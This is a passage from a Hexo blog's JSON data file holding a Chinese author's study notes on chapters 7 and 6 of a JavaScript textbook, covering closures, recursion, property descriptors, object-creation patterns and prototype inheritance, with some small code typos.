小结\n通过这章学习，还是不明白几个模式。但是对闭包有了很大的了解，知道闭包的原理。也明白了闭包的大多数应用场景。对今后的学习更加自信了。","source":"_posts/read-javascript-again-chapter7.md","raw":"---\ntitle: JavaScript高级程序设计重读---7章\ndate: 2017-07-13 16:01:13\ntags: javascript\ndir: javascript\nkeywords: JavaScript高级程序设计\n---\n### 函数表达式\n函数表达式和函数声明中，有以下因为函数声明有函数声明提升器，因此大多数用函数声明，但是函数表达式也有其运用场景\n```\n// 这种情况可能造成意想不到的情况\nif(condition){\n    function sayHi(){\n        alert('hi')\n    }\n}else {\n    function sayHi(){\n        alert('hello')\n    }\n}\n// 应该这样\nvar sayHi\nif(condition){\n    sayHi = function (){\n        alert('hi')\n    }\n}else {\n    sayHi = function (){\n        alert('hello')\n    }\n}\n\n```\n#### 递归\n```\nfunction factorial(num){\n    if(num <= 1){        \n        return 1\n    }else {\n        return num* factorial(num-1)\n    }\n}\n// 但是以下情况会出错\nvar another = factorial\nfactorial = null\nalert(another(4))   // 出错，因为factorial变量设置位null，结果现在factorial已经不再是函数\n//通过以下一种情况解决\nfunction factorial(num){\n    if(num <= 1){        \n        return 1\n    }else {\n        return num* arguments.callee(num-1)\n    }\n}\n// 上种情况在严格模式下有问题。这种情况可以代替函数名，在严格模式下依然可以生效\nvar factorail = (function f(num){\n    if(num <= 1){\n        return 1\n    }else{\n        return num * f(num -1)\n    }\n})\n```\n#### 闭包\n闭包（closure）是Javascript语言的一个难点，也是它的特色，很多高级应用都要依靠闭包实现。\n首先理解活动对象。活动对象是c语言里面称之为形参。在内存中，形参往往是在当前环境作用域的首位，其次是上一个环境，以此类推。因此其作用域链是由当前环境依次向上。\n正常函数是执行完成之后，函数内参数和变量将会清除。因此无法访问该变量。闭包是一种将当前函数返回，导致当前活动对象无法被销毁，到函数外即可取到变量。上代码\n```\nfunction create(){\n    var result = new Array();\n    for(var i = 0;i < 10; i++){\n        result[i] = function (num){\n            return function(){\n                return num\n            }\n        }(i)\n    }\n    return result\n}\n```\n此函数可以获取到i的值。通过访问不同的result函数以达到目的\n因此可以模仿块级作用域。\n```\n(function(){\n// 这里是块级作用域\n}())\n```\n#### 小结\n通过这章学习，还是不明白几个模式。但是对闭包有了很大的了解，知道闭包的原理。也明白了闭包的大多数应用场景。对今后的学习更加自信了。","slug":"read-javascript-again-chapter7","published":1,"updated":"2021-10-13T15:51:55.083Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz0900184jzxinr80d08","content":"<h3 id=\"函数表达式\"><a href=\"#函数表达式\" class=\"headerlink\" title=\"函数表达式\"></a>函数表达式</h3><p>函数表达式和函数声明中，有以下因为函数声明有函数声明提升器，因此大多数用函数声明，但是函数表达式也有其运用场景<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 这种情况可能造成意想不到的情况</span><br><span class=\"line\">if(condition)&#123;</span><br><span class=\"line\">    function sayHi()&#123;</span><br><span class=\"line\">        alert(&apos;hi&apos;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else &#123;</span><br><span class=\"line\">    function sayHi()&#123;</span><br><span class=\"line\">        alert(&apos;hello&apos;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// 应该这样</span><br><span class=\"line\">var sayHi</span><br><span class=\"line\">if(condition)&#123;</span><br><span class=\"line\">    sayHi = function ()&#123;</span><br><span class=\"line\">        alert(&apos;hi&apos;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else &#123;</span><br><span class=\"line\">    sayHi = function ()&#123;</span><br><span class=\"line\">        alert(&apos;hello&apos;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><h4 id=\"递归\"><a href=\"#递归\" class=\"headerlink\" title=\"递归\"></a>递归</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function factorial(num)&#123;</span><br><span class=\"line\">    if(num &lt;= 1)&#123;        </span><br><span class=\"line\">        return 1</span><br><span class=\"line\">    &#125;else &#123;</span><br><span class=\"line\">        return num* factorial(num-1)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// 但是以下情况会出错</span><br><span class=\"line\">var another = factorial</span><br><span class=\"line\">factorial = null</span><br><span class=\"line\">alert(another(4))   // 出错，因为factorial变量设置位null，结果现在factorial已经不再是函数</span><br><span class=\"line\">//通过以下一种情况解决</span><br><span class=\"line\">function factorial(num)&#123;</span><br><span class=\"line\">    if(num &lt;= 1)&#123;        </span><br><span class=\"line\">        return 1</span><br><span class=\"line\">    &#125;else &#123;</span><br><span class=\"line\">        return num* arguments.callee(num-1)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// 上种情况在严格模式下有问题。这种情况可以代替函数名，在严格模式下依然可以生效</span><br><span class=\"line\">var factorail = (function f(num)&#123;</span><br><span class=\"line\">    if(num &lt;= 1)&#123;</span><br><span class=\"line\">        return 1</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return num * f(num -1)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure><h4 id=\"闭包\"><a href=\"#闭包\" class=\"headerlink\" title=\"闭包\"></a>闭包</h4><p>闭包（closure）是Javascript语言的一个难点，也是它的特色，很多高级应用都要依靠闭包实现。<br>首先理解活动对象。活动对象是c语言里面称之为形参。在内存中，形参往往是在当前环境作用域的首位，其次是上一个环境，以此类推。因此其作用域链是由当前环境依次向上。<br>正常函数是执行完成之后，函数内参数和变量将会清除。因此无法访问该变量。闭包是一种将当前函数返回，导致当前活动对象无法被销毁，到函数外即可取到变量。上代码<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function create()&#123;</span><br><span class=\"line\">    var result = new Array();</span><br><span class=\"line\">    for(var i = 0;i &lt; 10; i++)&#123;</span><br><span class=\"line\">        result[i] = function (num)&#123;</span><br><span class=\"line\">            return function()&#123;</span><br><span class=\"line\">                return num</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;(i)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return result</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>此函数可以获取到i的值。通过访问不同的result函数以达到目的<br>因此可以模仿块级作用域。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(function()&#123;</span><br><span class=\"line\">// 这里是块级作用域</span><br><span class=\"line\">&#125;())</span><br></pre></td></tr></table></figure><p></p><h4 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>通过这章学习，还是不明白几个模式。但是对闭包有了很大的了解，知道闭包的原理。也明白了闭包的大多数应用场景。对今后的学习更加自信了。</p>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"函数表达式\"><a href=\"#函数表达式\" class=\"headerlink\" title=\"函数表达式\"></a>函数表达式</h3><p>函数表达式和函数声明中，有以下因为函数声明有函数声明提升器，因此大多数用函数声明，但是函数表达式也有其运用场景<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 这种情况可能造成意想不到的情况</span><br><span class=\"line\">if(condition)&#123;</span><br><span class=\"line\">    function sayHi()&#123;</span><br><span class=\"line\">        alert(&apos;hi&apos;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else &#123;</span><br><span class=\"line\">    function sayHi()&#123;</span><br><span class=\"line\">        alert(&apos;hello&apos;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// 应该这样</span><br><span class=\"line\">var sayHi</span><br><span class=\"line\">if(condition)&#123;</span><br><span class=\"line\">    sayHi = function ()&#123;</span><br><span class=\"line\">        alert(&apos;hi&apos;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else &#123;</span><br><span class=\"line\">    sayHi = function ()&#123;</span><br><span class=\"line\">        alert(&apos;hello&apos;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><h4 id=\"递归\"><a href=\"#递归\" class=\"headerlink\" title=\"递归\"></a>递归</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function factorial(num)&#123;</span><br><span class=\"line\">    if(num &lt;= 1)&#123;        </span><br><span class=\"line\">        return 1</span><br><span class=\"line\">    &#125;else &#123;</span><br><span class=\"line\">        return num* factorial(num-1)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// 但是以下情况会出错</span><br><span class=\"line\">var another = factorial</span><br><span class=\"line\">factorial = null</span><br><span class=\"line\">alert(another(4))   // 出错，因为factorial变量设置位null，结果现在factorial已经不再是函数</span><br><span class=\"line\">//通过以下一种情况解决</span><br><span class=\"line\">function factorial(num)&#123;</span><br><span class=\"line\">    if(num &lt;= 1)&#123;        </span><br><span class=\"line\">        return 1</span><br><span class=\"line\">    &#125;else &#123;</span><br><span class=\"line\">        return num* arguments.callee(num-1)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// 上种情况在严格模式下有问题。这种情况可以代替函数名，在严格模式下依然可以生效</span><br><span class=\"line\">var factorail = (function f(num)&#123;</span><br><span class=\"line\">    if(num &lt;= 1)&#123;</span><br><span class=\"line\">        return 1</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return num * f(num -1)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure><h4 id=\"闭包\"><a href=\"#闭包\" class=\"headerlink\" title=\"闭包\"></a>闭包</h4><p>闭包（closure）是Javascript语言的一个难点，也是它的特色，很多高级应用都要依靠闭包实现。<br>首先理解活动对象。活动对象是c语言里面称之为形参。在内存中，形参往往是在当前环境作用域的首位，其次是上一个环境，以此类推。因此其作用域链是由当前环境依次向上。<br>正常函数是执行完成之后，函数内参数和变量将会清除。因此无法访问该变量。闭包是一种将当前函数返回，导致当前活动对象无法被销毁，到函数外即可取到变量。上代码<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function create()&#123;</span><br><span class=\"line\">    var result = new Array();</span><br><span class=\"line\">    for(var i = 0;i &lt; 10; i++)&#123;</span><br><span class=\"line\">        result[i] = function (num)&#123;</span><br><span class=\"line\">            return function()&#123;</span><br><span class=\"line\">                return num</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;(i)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return result</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>此函数可以获取到i的值。通过访问不同的result函数以达到目的<br>因此可以模仿块级作用域。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(function()&#123;</span><br><span class=\"line\">// 这里是块级作用域</span><br><span class=\"line\">&#125;())</span><br></pre></td></tr></table></figure><p></p><h4 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>通过这章学习，还是不明白几个模式。但是对闭包有了很大的了解，知道闭包的原理。也明白了闭包的大多数应用场景。对今后的学习更加自信了。</p>"},{"title":"JavaScript高级程序设计重读---6章","date":"2017-07-13T07:43:38.000Z","dir":"javascript","keywords":"JavaScript高级程序设计","_content":"### 面向对象的程序设计\n#### 属性类型\nECMAScript中有两种属性，数据属性和访问器属性\n##### 数据属性\n[[Configurable]] : 表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为访问器属性。\n[[Enumerable]] : 表示能否通过 for-in 循环返回属性。\n[[Writable]] : 表示能否修改属性的值。\n[[Value]] : 包含这个属性的数据值。读取属性值的时候，从这个位置读；写入属性值时，把新值保存在这个位置。默认值是 undefined。\n\n_ps：将Configurable修改为false之后，除了Writable可修改之外，Configurable，Enumerable都不可再修改。_\n\n**Object.defineProperty可以为对象添加属性**\n##### 访问器属性\n[[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为数据属性。\n[[Enumerable]]：表示能否通过 for-in 循环返回属性。\n[[Get]]：在读取属性时调用的函数。默认值为 undefined。\n[[Set]]：在写入属性时调用的函数。默认值为 undefined。\n\n**get,set方法**\n有时候希望访问属性时能返回一个动态计算后的值, 或希望不通过使用明确的方法调用而显示内部变量的状态.在JavaScript中, 能通过使用 getter 实现. 尽管可能结合使用getter和setter创建一个伪属性,但不能既使用getter绑定到一个属性上,同时又用该属性真实的存储一个值.\n```\nvar book = {\n    _year : 2004,\n    edition : 1\n};\nObject.defineProperty(book,\"year\",{ \n    get : function () {\n        alert(this._year);\n    },\n    set : function (newValue) {\n        if (newValue > 2004) {\n            this._year = newValue;\n            this.edition += newValue - 2004;\n        }\n    }\n});\nbook.year;      // 弹出窗口，显示 2004\nbook.year = 2005;\nconsole.log(book.edition);   // 2\n```\nget，set方法可以动态的关注对象中变量的变化，可以使其他变量随着变化而变化。因此在某些情况下非常适用\n定义多个属性Object.defineProperties(obj, props)\n将defineProperty改为复数形式defineProperties，并将参数改为一个对象\n```\nvar obj = {};\nObject.defineProperties(obj, {\n  \"property1\": {\n    value: true,\n    writable: true\n  },\n  \"property2\": {\n    value: \"Hello\",\n    writable: false\n  }\n  // 等等.\n});\nconsole.log(obj); // Object {property1: true, property2: \"Hello\"}\n```\n读取给定属性的特性**Object.getOwnPropertyDescriptor(obj, prop)** 返回指定对象上一个自有属性对应的属性描述符。（自有属性指的是直接赋予该对象的属性，不需要从原型链上进行查找的属性）\n```\nvar man = {name: \"gdc\"};\nconsole.log(Object.getOwnPropertyDescriptor(man,\"name\"));\n// Object {value: \"gdc\", writable: true, enumerable: true, configurable: true}\nObject.defineProperties(man,{\n  name:{\n    writable: false\n  },\n  age:{\n    writable: true,\n    value: 22\n  }\n});\nconsole.log(Object.getOwnPropertyDescriptor(man,\"name\"));\n// Object {value: \"gdc\", writable: false, enumerable: true, configurable: true}\nconsole.log(Object.getOwnPropertyDescriptor(man,\"age\"));\n// Object {value: 22, writable: true, enumerable: false, configurable: false}\nvar descriptor = Object.getOwnPropertyDescriptor(man,\"age\");\nconsole.log(descriptor.value);         // 22\nconsole.log(descriptor.configurable);  // false\nconsole.log(descriptor.writable);      // true\nconsole.log(descriptor.get);           // undefined\nconsole.log(descriptor.set);           // undefined\n```\n读取当前属性，返回获取数据形式\n\n#### 创建对象\n##### 1、工厂模式：\n为了解决多个类似对象声明的问题，我们可以使用一种叫做 工厂模式的方法，这种方法就是为了解决实例化对象产生大量重复的问题。\n```\nfunction createObject(name,age,profession){//集中实例化的函数\n        var obj = new Object();\n        obj.name = name;\n        obj.age = age;\n        obj.profession = profession;\n        obj.move = function () {\n            return this.name + ' at ' + this.age + ' engaged in ' + this.profession;\n        };\n        return obj;\n    }\n    var test1 = createObject('trigkit4',22,'programmer');//第一个实例\n    var test2 = createObject('mike',25,'engineer');//第二个实例\n    alert(test1.move());\n    alert(test2.move());\n```\n**利:**\n主要好处就是可以消除对象间的耦合，通过使用工程方法而不是new关键字。将所有实例化的代码集中在一个位置防止代码重复\n\n**弊:**\n大多数类最好使用new关键字和构造函数，可以让代码更加简单易读。而不必去查看工厂方法来知道。\n\n**何时使用？**\n1、当对象或组件涉及高复杂性时\n2、当需要根据所在的不同环境轻松生成对象的不同实例时\n3、当处理很多共享相同属性的小型对象或组件时\n\n##### Constructor(构造器)模式\nECMAScript 中可以采用构造函数(构造方法)可用来创建特定的对象。 该模式正好可以解决以上的工厂模式无法识别对象实例的问题。\n```\nfunction Car(model,year,miles){//构造函数模式\n    this.model = model;\n    this.year = year;\n    this.miles = miles;\n    this.run = function () {\n        return this.model + \" has done \" + this.miles + \"miles\";\n    }\n}\nvar Benz = new Car('Benz',2014,20000);\nvar BMW = new Car(\"BMW\",2013,12000);\nalert(Benz instanceof Car); //很清晰的识别他从属于 Car,true\nconsole.log(Benz.run());\nconsole.log(BMW.run());\n```\n**和工厂模式相比：**\n1.构造函数方法没有显示的创建对象 (new Object());\n2.直接将属性和方法赋值给 this 对象;\n3.没有 renturn 语句。\n\n##### 原型模式\n```\nfunction Person(){}\nPerson.prototype.name = \"gdccwxx\";  \nPerson.prototype.age =23;  \nPerson.prototype.sayName = function(){  \n    console.log(this.name)  \n};  \nvar person1 = new Person();  \nperson1.sayName()     // gdccwxx\nvar person2 = new Person();\nperson2.sayName()     // gdccwxx\nperson1.sayName == person2.sayName  // true\n\n```\n**Person类与构造函数，原型存在如下关系**\n\nPerson的原型是person1和person2的原型。而Person.prototype.constructor右指回了Person\n使用isPrototypeOf()判断对详见是否存在这种关系\n```\nPerson.prototype.isPrototypeOf(person1) // true\nPerson.prototype.isPrototypeOf(person2) // true\n\n```\n虽然对象实例访问保存在原型中的值，却不能通过对象实例重写原型中的值。如果在对象里面添加一个属性，该属性只会存在于对象实例中，而屏蔽原型。即\n```\nfunction Person(){}\nPerson.prototype.name = \"gdccwxx\";  \nPerson.prototype.age =23;  \nPerson.prototype.sayName = function(){  \n    console.log(this.name)  \n};  \nvar person1 = new Person();  \nperson1.sayName()     // gdccwxx\nvar person2 = new Person();\nperson2.sayName()     // gdccwxx\nperson1.name = 'guo'\nperson1.name    // guo\nperson2.name    // gdccwxx\ndelete person1.name \nperson1.name    // gdccwxx\n```\n对象搜索属性中，先在实例中搜索，实例中有，则直接返回，实例中没有，则到其原型中查找。若在原型中未找到，则返回undefined；若找到则返回。因此，对person1实例添加name属性后，就屏蔽了原型里面的name，删除实例后的属性之后，又去原型里查找。\n_ps：原型属性不可被delete掉_\nhasOwnProperty()确定属性是否在实例上的方法\n原型与in操作符\nin有两种操作，第一种是在for-in循环中使用，另一种是会在通过对象能够访问的给定属性时返回true\n```\nfunction Person(){}\nPerson.prototype.name = \"gdccwxx\";  \nPerson.prototype.age =23;  \nPerson.prototype.sayName = function(){  \n    console.log(this.name)  \n};  \nvar person1 = new Person();  \nvar person2 = new Person();\nperson1.hasOwnProperty('name')  // 在原型上，返回false\n'name' in person1       //能够访问，true\nperson1.name = 'guo'\nperson1.name            // guo\nperson1.hasOwnProperty('name')  // true\n'name' in person1       //能够访问，true\nperson2.name            // guo\nperson2.hasOwnProperty('name')  //false\n'name' in person2       // true\ndelete person1.name\nperson1.name            // gdccwxx\nperson1.hasOwnProperty('name')  // 在原型上，返回false\n'name' in person1       //能够访问，true\n```\nObject.keys()方法，获取对象所有可枚举实例属性\n```\nfunction Person(){}\nPerson.prototype.name = \"gdccwxx\";  \nPerson.prototype.age =23;  \nPerson.prototype.sayName = function(){  \n    console.log(this.name)  \n};  \nvar keys = Object.keys(Person.prototype)\nkeys            // name,age,sayName\nvar p1 = new Person();\np1.name = 'guo'\np1.age = '20'\nvar p1keys = Object.keys(p1)\np1keys  // 'name,age'\n// 获得所有实例属性，无论是否可枚举，使用Object.getOwnPropertyNames()\nvar keys = Object.getOwnPropertyNames(Person.prototype)\nkeys    // [\"constructor\", \"name\", \"age\", \"sayName\"]\n// 也可以使用另一种原型定义方法，字面量方法\nfunction Person(){}\nPerson.prototype = {\n    name : 'gdccwxx',\n    age : 20,\n    sayName: function(){\n        //\n    }\n}\n//如果constructor很重要，也可以特意设定\nPerson.prototype = {\n    constructor: Person,\n    name : 'gdccwxx',\n    age : 20,\n    sayName: function(){\n        //\n    }\n}\n//这种重设constructor会导致其Enumerable属性变为true。如果要重设，应使用defineProperty\nObject.defineProperty(Person.prototype, 'constructor',{\n    enumerable: false,\n    value: Person\n})\n```\n由于是person指针指向Person的prototype，因此在Person任意改变prototype的情况下，会导致所有子元素都改变。因此大多都很少单独使用原型模式\n**组合使用构造函数模式和原型模式**\n将函数使用prototype模式，其他基本类型使用构造函数.可以达到节省内存，又拥有实例和副本。\n```\nfunction Person(name,age,job){\n    this.name = name;\n    this.age = age;\n    this.job = job;\n    this.friend = ['a','b']\n}\nPerson.prototype = {\n    constructor: Person,\n    sayName : function(){\n        console.log(this.name)\n    }\n}\nvar person1 = new Person('gdccwxx', 20 ,'SoftWare')\nvar person2 = new Person('guo', 10 ,'Doctor')\nperson1.friends.push('van')\nperson1.friend      // a,b,van\nperson2.friend      // a,b\nperson1.friend === person2.friend   //false\nperson1.sayName === person2.sayName   //true\n```\n#### 继承\n##### 原型链\n原型链是JavaScript的主要实现继承方法\n```\nfunction SuperType(){\n    this.property = true\n}\nSuperType.prototype.getSuperValue = function(){\n    return this.property;\n}\nfunction SubType(){\n    this.subproperty = false\n}\nSubtype.prototype = new SuperType()\nSubType.prototype.getSubValue = function(){\n    return this.subproperty;\n}\nvar instance = new SubType();\nvar instance = new SubType()\ninstance.getSuperValue()    //true\n```\ninstance的原型连集成了SuperType方法\n##### 寄生组合式继承\n```\nfunction inheritPrototype(subType, superType){\n    var prototype = object(superType.prototype) // 创建对象\n    prototype.constructor = subType             // 增强对象\n    subType.prototype = prototype               // 指定对象\n}\nfunction SuperType(name){\n    this.name = name;\n    this.colors = ['red','blue','green']\n}\nSuperType.prototype.sayName = function(){\n    return this.name\n}\nfunction SubType(name, age){\n    SuperType.call(this, name)      \n    this.age = age\n}\ninheritPrototype(SubType, SuperType);\nSubType.prototype.sayAge = function(){\n    return this.age\n}\n```\n通过上述继承方式，少用了一次构造函数，并且因此避免了在SuperType.prototype上的不必要创建、多余的属性\n##### 小结\n通过本章的学习，深入理解了原型以及原型链上继承的问题。之前没用用过的defineProperty和prototype，都逐渐明白了其用处以及用法。通过原型链，构造函数等学习，让我对JavaScript的理解更上一步。以及对对象的理解更加深刻。不仅仅是属性以及value那么简单。对内存的分配以及效率的使用更加深刻。","source":"_posts/read-javascript-again-chapter6.md","raw":"---\ntitle: JavaScript高级程序设计重读---6章\ndate: 2017-07-13 15:43:38\ntags: javascript\ndir: javascript\nkeywords: JavaScript高级程序设计\n---\n### 面向对象的程序设计\n#### 属性类型\nECMAScript中有两种属性，数据属性和访问器属性\n##### 数据属性\n[[Configurable]] : 表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为访问器属性。\n[[Enumerable]] : 表示能否通过 for-in 循环返回属性。\n[[Writable]] : 表示能否修改属性的值。\n[[Value]] : 包含这个属性的数据值。读取属性值的时候，从这个位置读；写入属性值时，把新值保存在这个位置。默认值是 undefined。\n\n_ps：将Configurable修改为false之后，除了Writable可修改之外，Configurable，Enumerable都不可再修改。_\n\n**Object.defineProperty可以为对象添加属性**\n##### 访问器属性\n[[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为数据属性。\n[[Enumerable]]：表示能否通过 for-in 循环返回属性。\n[[Get]]：在读取属性时调用的函数。默认值为 undefined。\n[[Set]]：在写入属性时调用的函数。默认值为 undefined。\n\n**get,set方法**\n有时候希望访问属性时能返回一个动态计算后的值, 或希望不通过使用明确的方法调用而显示内部变量的状态.在JavaScript中, 能通过使用 getter 实现. 尽管可能结合使用getter和setter创建一个伪属性,但不能既使用getter绑定到一个属性上,同时又用该属性真实的存储一个值.\n```\nvar book = {\n    _year : 2004,\n    edition : 1\n};\nObject.defineProperty(book,\"year\",{ \n    get : function () {\n        alert(this._year);\n    },\n    set : function (newValue) {\n        if (newValue > 2004) {\n            this._year = newValue;\n            this.edition += newValue - 2004;\n        }\n    }\n});\nbook.year;      // 弹出窗口，显示 2004\nbook.year = 2005;\nconsole.log(book.edition);   // 2\n```\nget，set方法可以动态的关注对象中变量的变化，可以使其他变量随着变化而变化。因此在某些情况下非常适用\n定义多个属性Object.defineProperties(obj, props)\n将defineProperty改为复数形式defineProperties，并将参数改为一个对象\n```\nvar obj = {};\nObject.defineProperties(obj, {\n  \"property1\": {\n    value: true,\n    writable: true\n  },\n  \"property2\": {\n    value: \"Hello\",\n    writable: false\n  }\n  // 等等.\n});\nconsole.log(obj); // Object {property1: true, property2: \"Hello\"}\n```\n读取给定属性的特性**Object.getOwnPropertyDescriptor(obj, prop)** 返回指定对象上一个自有属性对应的属性描述符。（自有属性指的是直接赋予该对象的属性，不需要从原型链上进行查找的属性）\n```\nvar man = {name: \"gdc\"};\nconsole.log(Object.getOwnPropertyDescriptor(man,\"name\"));\n// Object {value: \"gdc\", writable: true, enumerable: true, configurable: true}\nObject.defineProperties(man,{\n  name:{\n    writable: false\n  },\n  age:{\n    writable: true,\n    value: 22\n  }\n});\nconsole.log(Object.getOwnPropertyDescriptor(man,\"name\"));\n// Object {value: \"gdc\", writable: false, enumerable: true, configurable: true}\nconsole.log(Object.getOwnPropertyDescriptor(man,\"age\"));\n// Object {value: 22, writable: true, enumerable: false, configurable: false}\nvar descriptor = Object.getOwnPropertyDescriptor(man,\"age\");\nconsole.log(descriptor.value);         // 22\nconsole.log(descriptor.configurable);  // false\nconsole.log(descriptor.writable);      // true\nconsole.log(descriptor.get);           // undefined\nconsole.log(descriptor.set);           // undefined\n```\n读取当前属性，返回获取数据形式\n\n#### 创建对象\n##### 1、工厂模式：\n为了解决多个类似对象声明的问题，我们可以使用一种叫做 工厂模式的方法，这种方法就是为了解决实例化对象产生大量重复的问题。\n```\nfunction createObject(name,age,profession){//集中实例化的函数\n        var obj = new Object();\n        obj.name = name;\n        obj.age = age;\n        obj.profession = profession;\n        obj.move = function () {\n            return this.name + ' at ' + this.age + ' engaged in ' + this.profession;\n        };\n        return obj;\n    }\n    var test1 = createObject('trigkit4',22,'programmer');//第一个实例\n    var test2 = createObject('mike',25,'engineer');//第二个实例\n    alert(test1.move());\n    